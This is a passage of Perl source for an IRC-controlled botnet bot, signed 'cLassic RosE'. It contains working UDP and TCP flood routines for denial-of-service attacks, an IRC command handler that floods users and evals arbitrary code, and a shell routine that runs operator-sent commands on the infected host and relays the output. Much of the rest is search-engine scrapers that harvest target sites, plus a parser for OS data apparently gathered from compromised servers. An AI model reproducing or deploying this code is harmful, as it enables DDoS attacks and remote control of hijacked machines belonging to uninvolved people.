sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Http DDoS13�+=+� Flooding done 12 ".$1.".");
}
######################
#  End of HTTPFlood  # 
#                    #
######################
# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE
######################
#     UDPFlood       # 
#                    #
######################
if ($funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/) {
sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Udp DDoS13�+=+� Flooding started12 ".$1." with 12 ".$2." Kb Packets for 12 ".$3." seconds.");
my ($dtime, %pacotes) = udpflooder("$1", "$2", "$3");
$dtime = 1 if $dtime == 0;
my %bytes;
$bytes{igmp} = $2 * $pacotes{igmp};
$bytes{icmp} = $2 * $pacotes{icmp};
$bytes{o} = $2 * $pacotes{o};
$bytes{udp} = $2 * $pacotes{udp};
$bytes{tcp} = $2 * $pacotes{tcp};
sendraw($IRC_cur_socket, "PRIVMSG $printl :13�+=+�Udp DDoS13�+=+� Results12 ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb in12 ".$dtime." seconds to12 ".$1.".");
}
exit;
}
}
######################
#  End of Udpflood   # 
#                    #
######################


sub ircase {
my ($kem, $printl, $case) = @_;
  if ($case =~ /^join (.*)/) {
     j("$1");
   }
   if ($case =~ /^part (.*)/) {
      p("$1");
   }
if ($case =~ /^rejoin\s+(.*)/) {
my $chan = $1;
if ($chan =~ /^(\d+) (.*)/) {
for (my $ca = 1; $ca <= $1; $ca++ ) {
p("$2");
j("$2");
}
}
else {
p("$chan");
j("$chan");
}
}

if ($case =~ /^op/) {
op("$printl", "$kem") if $case eq "op";
my $oarg = substr($case, 3);
op("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^deop/) {
deop("$printl", "$kem") if $case eq "deop";
my $oarg = substr($case, 5);
deop("$1", "$2") if ($oarg =~ /(\S+)\s+(\S+)/);
}

if ($case =~ /^msg\s+(\S+) (.*)/) {
msg("$1", "$2");
}

if ($case =~ /^flood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
msg("$2", "$3");
}
}

if ($case =~ /^ctcp\s+(\S+) (.*)/) {
ctcp("$1", "$2");
}

if ($case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/) {
for (my $cf = 1; $cf <= $1; $cf++) {
ctcp("$2", "$3");
}
}

if ($case =~ /^nick (.*)/) {
nick("$1");
}

if ($case =~ /^connect\s+(\S+)\s+(\S+)/) {
conectar("$2", "$1", 6667);
}

if ($case =~ /^raw (.*)/) {
sendraw("$1");
}

if ($case =~ /^eval (.*)/) {
eval "$1";
}
}


sub shell {
my $printl=$_[0];
my $comando=$_[1];
if ($comando =~ /cd (.*)/) {
chdir("$1") || msg("$printl", "No such file or directory");
return;
}

elsif ($pid = fork) {
waitpid($pid, 0);
}
else {
if (fork) {
exit;

} else {
my @resp=`$comando 2>&1 3>&1`;
my $c=0;
foreach my $linha (@resp) {
  $c++;
  chop $linha;
  sendraw($IRC_cur_socket, "PRIVMSG $printl :$linha");
  if ($c == "$linas_max") {
    $c=0;
    sleep $sleep;
  }
}
exit;
}
}
}

sub tcpflooder {
my $itime = time;
my ($cur_time);
my ($ia,$pa,$proto,$j,$l,$t);
$ia=inet_aton($_[0]);
$pa=sockaddr_in($_[1],$ia);
$ftime=$_[2];
$proto=getprotobyname('tcp');
$j=0;$l=0;
$cur_time = time - $itime;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
socket($t,PF_INET,SOCK_STREAM,$proto);
connect($t,$pa)||$j--;
$j++;$l++;
}
$l=0;
while ($l<1000){
$cur_time = time - $itime;
last if $cur_time >= $ftime;
$t="SOCK$l";
shutdown($t,2);
$l++;
}
}

# Love Is The Best Way Of Suicide
#	
#                                                               
# cLassic RosE

sub udpflooder {
my $iaddr = inet_aton($_[0]);
my $msg = 'A' x $_[1];
my $ftime = $_[2];
my $cp = 0;
my (%pacotes);
$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
return(undef) if $cp == 4;
my $itime = time;
my ($cur_time);
while ( 1 ) {
for (my $porta = 1;
$porta <= 65000; $porta++) {
$cur_time = time - $itime;
last if $cur_time >= $ftime;
send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


for (my $pc = 3;
$pc <= 255;$pc++) {
next if $pc == 6;
$cur_time = time - $itime;
last if $cur_time >= $ftime;
socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
}
}
last if $cur_time >= $ftime;
}
return($cur_time, %pacotes);
}

sub ctcp {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :\001$_[1]\001");
}

sub msg {
return unless $#_ == 1;
sendraw("PRIVMSG $_[0] :$_[1]");
}

sub notice {
return unless $#_ == 1;
sendraw("NOTICE $_[0] :$_[1]");
}

sub op {
return unless $#_ == 1;
sendraw("MODE $_[0] +o $_[1]");
}

sub deop {
return unless $#_ == 1;
sendraw("MODE $_[0] -o $_[1]");
}

sub j {
&join(@_);
}

sub join {
return unless $#_ == 0;
sendraw("JOIN $_[0]");

}
sub p { part(@_);
}

sub part {
sendraw("PART $_[0]");
}

sub nick {
return unless $#_ == 0;
sendraw("NICK $_[0]");
}

sub quit {
sendraw("QUIT :$_[0]");
}

#####
# SUBS GOOGLE
#####
sub googlet {
my @dominios = ("ae","com.ar","at","com.au","be","com.br","ca","ch","cl","de","dk");
my @country = ("AE","AR","AT","AU","BE","BR","CA","CH","CL","DE","DK");
my @lang = ("en","es","de","nl","pt-BR","it","de","fo","sv","fr","el");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $i (@dominios){
my @lista = google($i,$key,$lang[$c],$country[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}

sub google(){
my @lst;
my $i=$_[0];
my $key=$_[1];
my $lang= $_[2];
my $country =$_[3];
for($b=0;$b<=5000;$b+=100){
my $Go=("www.google.ru".$i."/search?hl=".$lang."&q=".key($key)."&num=100&start=".$b."&meta=cr%3Dcountry".$country);
my $Res=query($Go);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /google/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS AllTheWeb
#####

sub allthewebt {
my @lang = ("en","es","de","nl","pt-BR","it","de","fo");
my @lst;
my $key=key($_[0]);
my $c=0;
foreach my $lang (@lang){
my @lista = alltheweb($key,$lang[$c]);
push(@lst,@lista);
$c++;
}
return @lst;
}


sub alltheweb(){
my @lista;
my $key = $_[0];
my $lang= $_[1];
for($b=0;$b<=500;$b+=100){
my $alltheweb=("http://www.alltheweb.com/search?cat=web&_sb_lang=".$lang."&hits=100&q=".key($key)."&o=".$b);
my $Res=query($alltheweb);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub standard()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=100)
{
my $all=("http://www.alltheweb.com/search?cat=web&_sb_lang=any&hits=100&q=".key($key)."&o=".$i);
my $Res=query($all);
while($Res =~ m/<span class=\"?resURL\"?>http:\/\/(.+?)\<\/span>/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS Lycos
#####
sub lycos(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $ly=("http://search.lycos.com/?query=".key($key)."&page=$av".$b);
my $Res=query($ly);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS Yahoo
#####
sub yahoo(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=100){
my $Ya=("http://br.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;

$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahooa(){
my @lst;
my $key = $_[0];
for($b=210;$b<=1000;$b+=210){
my $Ya=("http://be.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahoob(){
my @lst;
my $key = $_[0];
for($b=410;$b<=1000;$b+=210){
my $Ya=("http://us.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahooc(){
my @lst;
my $key = $_[0];
for($b=610;$b<=1000;$b+=210){
my $Ya=("http://it.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub yahood(){
my @lst;
my $key = $_[0];
for($b=810;$b<=1000;$b+=210){
my $Ya=("http://de.search.yahoo.com/search?ei=UTF-8&fr=cb-globo&fr2=sfp&p=".key($key)."&n=100&fr=sfp&b=".$b);
my $Res=query($Ya);
while($Res =~ m/\<span class=yschurl>(.+?)\<\/span>/g){
my $k=$1;
$k=~s/<b>//g;
$k=~s/<\/b>//g;
$k=~s/<wbr>//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS MSN
#####
sub msn(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $MsN=("http://search.live.com/results.aspx?q=".key($key)."&first=".$b."&FORM=PERE");
my $Res=query($MsN);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if($1 !~ /msn|live/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS SEARCH
#####
sub search(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $ser=("http://www.search.com/search?q=".key($key)."".$b);
my $Res=query($ser);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# SUBS FireBall
#####
sub fireball(){
my $key=$_[0];
my $inizio=1;
my $pagine=200;
my @lst;
my $av=0;
while($inizio <= $pagine){
my $Go=("www.google.ge".$i."/search?hl=".$lang."&q=".key($key)."&num=100&start=".$b."&meta=cr%3Dcountry".$country);
my $Res=query($fireball);
while ($Res=~ m/<a href=\"?http:\/\/(.+?)\//g ){
if ($1 !~ /msn|live|google|yahoo/){
my $k="$1/";
my @grep=links($k);
push(@lst,@grep);
}}
$av=$av+10;
$inizio++;
}
return @lst;
}

#####
# SUBS UOL
#####
sub uol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $UoL=("http://busca.uol.com.br/www/index.html?q=".key($key)."&start=".$i);
my $Res=query($UoL);
while($Res =~ m/<a href=\"http:\/\/([^>\"]*)/g){
my $k=$1;
if($k!~/busca|uol|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# Altavista
#####
sub altavista(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://it.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistade(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://de.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub altavistaus(){
my @lst;
my $key = $_[0];
for($b=1;$b<=1000;$b+=10){
my $AlT=("http://us.altavista.com/web/results?itag=ody&kgs=0&kls=0&dis=1&q=".key($key)."&stq=".$b);
my $Res=query($AlT);
while($Res=~m/<span class=ngrn>(.+?)\//g){
if($1 !~ /altavista/){
my $k=$1;
$k=~s/<//g;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# HotBot
#####
sub hotbot(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $hot=("http://search.hotbot.de/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=hb_loc&enc=utf-8".$b);
my $Res=query($hot);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

sub hotbotb(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $hot=("http://search.hotbot.co.uk/cgi-bin/pursuit?pag=$av&query=".key($key)."&cat=hb_loc&enc=utf-8".$b);
my $Res=query($hot);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# Mamma
#####
sub mamma(){
my @lst;
my $key = $_[0];
for($b=0;$b<=1000;$b+=100){
my $mam=("http://www.mamma.com/Mamma?utfout=$av&qtype=0&query=".key($key)."".$b);
my $Res=query($mam);
while($Res =~ m/<a href=\"?http:\/\/([^>\"]*)\//g){
if ($1 !~ /msn|live|google|yahoo/){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}}
return @lst;
}

#####
# MozBot
#####
sub mozbot()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=100; $i+=1){
my $mozbot=("http://www.mozbot.fr/search?q=".key($key)."&st=int&page=".$i);
my $Res=query($mozbot);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub mozbota()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=100; $i+=1){
my $mozbot=("http://www.mozbot.co.uk/search?q=".key($key)."&st=int&page=".$i);
my $Res=query($mozbot);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub mozbotb()
{
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=100; $i+=1){
my $mozbot=("http://www.mozbot.com/search?q=".key($key)."&st=int&page=".$i);
my $Res=query($mozbot);
while($Res =~ m/<a href=\"?http:\/\/(.+?)\" target/g){
my $k=$1;
$k=~s/ //g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS AOL
#####
sub aol(){
my @lst;
my $key = $_[0];
for($b=1;$b<=100;$b++){
my $AoL=("http://search.aol.co.uk/aol/search?query=".key($key)."&page=".$b."&nt=null&ie=UTF-8");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub aola(){
my @lst;
my $key = $_[0];
for($b=1;$b<=59;$b+=1){
my $AoL=("http://205.188.99.136/aol/search?query=".key($key)."&page=".$b."&count_override=20&lr=lang_en");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub aolb(){
my @lst;
my $key = $_[0];
for($b=1;$b<=59;$b+=1){
my $AoL=("http://search.aol.com/aol/search?query=".key($key)."&page=".$b."&count_override=20&lr=lang_de");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub aolc(){
my @lst;
my $key = $_[0];
for($b=1;$b<=59;$b+=1){
my $AoL=("http://64.12.129.44/aol/search?query=".key($key)."&page=".$b."&count_override=20&lr=lang_fr");
my $Res=query($AoL);
while($Res =~ m/<p class=\"deleted\" property=\"f:url\">http:\/\/(.+?)\<\/p>/g){
my $k=$1;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

#####
# SUBS ASK
#####
sub ask(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://it.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub aska(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://uk.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub askb(){
my @lst;
my $key=$_[0];
my $i=0;
my $pg=0;
for($i=0; $i<=1000; $i+=10)
{
my $Ask=("http://de.ask.com/web?q=".key($key)."&o=312&l=dir&qsrc=0&page=".$i."&dm=all");
my $Res=query($Ask);
while($Res=~m/<a id=\"(.*?)\" class=\"(.*?)\" href=\"(.+?)\onmousedown/g){
my $k=$3;
$k=~s/[\"\ ]//g;
my @grep=links($k);
push(@lst,@grep);
}}
return @lst;
}

sub links()
{
my @l;
my $link=$_[0];
my $host=$_[0];
my $hdir=$_[0];
$hdir=~s/(.*)\/[^\/]*$/\1/;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$host.="/";
$link.="/";
$hdir.="/";
$host=~s/\/\//\//g;
$hdir=~s/\/\//\//g;
$link=~s/\/\//\//g;
push(@l,$link,$host,$hdir);
return @l;
}

sub geths(){
my $host=$_[0];
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
return $host;
}

sub os(){
my $sito=$_[0];
my $Res=query($sito);
my $type;
my $free;
my $str;
while($Res=~m/<br>OSTYPE:(.+?)\<br>/g){
$type=$1;
}
while($Res=~m/<br>Free:(.+?)\<br>/g){
$free=$1;
}
$str=$type.",".$free;
return $str;
}

sub key(){
my $chiave=$_[0];
$chiave =~ s/ /\+/g;
$chiave =~ s/:/\%3A/g;
$chiave =~ s/\//\%2F/g;
$chiave =~ s/&/\%26/g;
$chiave =~ s/\"/\%22/g;
$chiave =~ s/,/\%2C/g;
$chiave =~ s/\\/\%5C/g;
return $chiave;
}

sub query($){
my $url=$_[0];
$url=~s/http:\/\///;
my $host=$url;
my $query=$url;
my $page="";
$host=~s/href=\"?http:\/\///;
$host=~s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query=~s/$host//;
if ($query eq "") {$query="/";};
eval {
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
close($sock);
};
return $page;
}

sub unici{
my @unici = ();
my %visti = ();
foreach my $elemento ( @_ )
{
next if $visti{ $elemento }++;
push @unici, $elemento;
}   
return @unici;
}

sub http_query($){
my ($url) = @_;
my $host=$url;
my $query=$url;
my $page="";
$host =~ s/href=\"?http:\/\///;
$host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
$query =~s/$host//;
if ($query eq "") {$query="/";};
eval {
local $SIG{ALRM} = sub { die "1";};
alarm 10;
my $sock = IO::Socket::INET->new(PeerAddr=>"$host",PeerPort=>"80",Proto=>"tcp") or return;
print $sock "GET $query HTTP/1.0\r\nHost: $host\r\nAccept: */*\r\nUser-Agent: Mozilla/5.0\r\n\r\n";
my @r = <$sock>;
$page="@r";
alarm 0;
close($sock);
};
return $page;
}
}


##################################################
# Love Is The Best Way Of Suicide

